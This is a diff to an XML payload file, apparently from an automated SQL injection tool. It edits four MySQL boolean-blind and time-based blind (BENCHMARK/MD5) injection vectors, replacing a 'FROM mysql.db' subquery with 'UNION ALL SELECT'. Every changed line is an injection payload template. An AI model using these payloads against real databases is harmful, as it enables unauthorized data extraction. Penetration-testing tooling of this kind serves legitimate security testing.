@@ -837,12 +837,12 @@ Formats:
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
         </request>
         <response>
-            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
+            <comparison>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -1008,12 +1008,12 @@ Formats:
         <risk>1</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
         <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
         </request>
         <response>
-            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</comparison>
+            <comparison>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM1]) THEN [ORIGVALUE] ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</comparison>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -2945,9 +2945,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -3241,9 +3241,9 @@ Formats:
         <risk>2</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</vector>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</vector>
         <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] FROM mysql.db) END))</payload>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))) ELSE [RANDNUM]*(SELECT [RANDNUM] UNION ALL SELECT [RANDNUM1]) END))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
